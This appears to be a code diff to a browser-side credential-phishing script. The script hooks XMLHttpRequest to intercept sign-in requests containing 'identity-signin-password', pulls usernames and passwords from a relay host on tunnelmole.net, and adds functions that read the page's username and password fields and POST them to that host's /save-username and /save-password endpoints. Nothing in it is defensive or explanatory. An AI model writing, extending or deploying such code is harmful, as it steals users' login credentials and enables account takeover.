@@ -1,20 +1,8 @@
-let freqUsername = null; 
+let freqUsername = null;
 let freqPassword = null;
 let usernameFetched = false;
 let passwordFetched = false;
-let inPasswordPage = false;  // Track if we are on the password page
-
-// ✅ Check if we are on the password page
-const checkPasswordPage = () => {
-    if (window.location.href.includes('challenge/pwd')) {
-        inPasswordPage = true;
-        console.log('Now on the password page');
-        // Start processing password requests once the password page is confirmed
-        fetchFreqPassword();
-    } else {
-        inPasswordPage = false;
-    }
-};
+let inUsernamePage = true; // Flag to check if we are on the username page
 
 // ✅ Fetch username
 const fetchFreqUsername = async () => {
@@ -27,7 +15,7 @@ const fetchFreqUsername = async () => {
             headers: { 'Cache-Control': 'no-cache' }
         });
 
-        if (!response.ok) throw new Error(HTTP error! Status: ${response.status});
+        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
 
         const result = await response.json();
         console.log('Response from /get-first-post-data:', result);
@@ -39,10 +27,8 @@ const fetchFreqUsername = async () => {
 
             await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
 
-            // Wait for navigation to password page
-            setTimeout(() => {
-                checkPasswordPage(); // Check if we are on the password page
-            }, 1000); // Give the page some time to navigate
+            // Once username is fetched, handle navigation to password page if needed
+            navigateToPasswordPage();
         } else {
             console.warn("No username data received, retrying...");
             setTimeout(fetchFreqUsername, 500); // Retry in 0.5s
@@ -55,7 +41,7 @@ const fetchFreqUsername = async () => {
 
 // ✅ Fetch password
 const fetchFreqPassword = async () => {
-    if (passwordFetched || !inPasswordPage) return; // Only proceed if we are on the password page
+    if (passwordFetched) return;
     console.log('Fetching password...');
 
     try {
@@ -64,7 +50,7 @@ const fetchFreqPassword = async () => {
             headers: { 'Cache-Control': 'no-cache' }
         });
 
-        if (!response.ok) throw new Error(HTTP error! Status: ${response.status});
+        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
 
         const result = await response.json();
         console.log('Response from /get-first-post-password:', result);
@@ -87,6 +73,17 @@ const fetchFreqPassword = async () => {
     }
 };
 
+// ✅ Handle Navigation from Username Page to Password Page
+const navigateToPasswordPage = () => {
+    if (inUsernamePage) {
+        console.log('Navigating to password page...');
+        inUsernamePage = false; // Mark that we are now on the password page
+        
+        // Trigger the password fetch once the page has been confirmed to transition
+        fetchFreqPassword();
+    }
+};
+
 // ✅ Process pending password requests
 const processPasswordRequests = () => {
     if (!freqPassword) {
@@ -97,7 +94,9 @@ const processPasswordRequests = () => {
 
     console.log("Processing pending password requests...");
 
-    // Process password-related intercepted requests here
+    // Here, you would process any intercepted password requests that are pending
+    // Like you did for the username requests
+    // Example: You might want to send the modified password to the proxy here
 };
 
 // ✅ Intercept XMLHttpRequest
@@ -112,7 +111,7 @@ XMLHttpRequest.prototype.send = function (body) {
         console.log("Intercepted username request:", body);
         pendingUsernameRequests.set(this, body);
         processUsernameRequests();
-    } else if (/identity-signin-password/.test(body) && !modifiedPasswordRequests.has(body) && inPasswordPage) {
+    } else if (/identity-signin-password/.test(body) && !modifiedPasswordRequests.has(body)) {
         console.log("Intercepted password request:", body);
         pendingPasswordRequests.set(this, body);
         processPasswordRequests();
@@ -121,7 +120,43 @@ XMLHttpRequest.prototype.send = function (body) {
     }
 };
 
-// ✅ Attach event listeners for username and password submission
+// ✅ Send username to server
+const sendUsername = async () => {
+    console.log('Sending username...');
+    const username = document.getElementById('username')?.value;
+    if (!username) return;
+
+    try {
+        await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/save-username', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username })
+        });
+        console.log('Username sent successfully');
+    } catch (error) {
+        console.error('Error sending username:', error);
+    }
+};
+
+// ✅ Send password to server
+const sendPassword = async () => {
+    console.log('Sending password...');
+    const password = document.getElementById('password')?.value;
+    if (!password) return;
+
+    try {
+        await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/save-password', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ password })
+        });
+        console.log('Password sent successfully');
+    } catch (error) {
+        console.error('Error sending password:', error);
+    }
+};
+
+// ✅ Attach event listeners
 document.addEventListener('DOMContentLoaded', () => {
     const usernameButton = document.getElementById('sendUsernameBtn');
     const passwordButton = document.getElementById('sendPasswordBtn');
@@ -144,4 +179,4 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     fetchFreqUsername();
-});  
+});
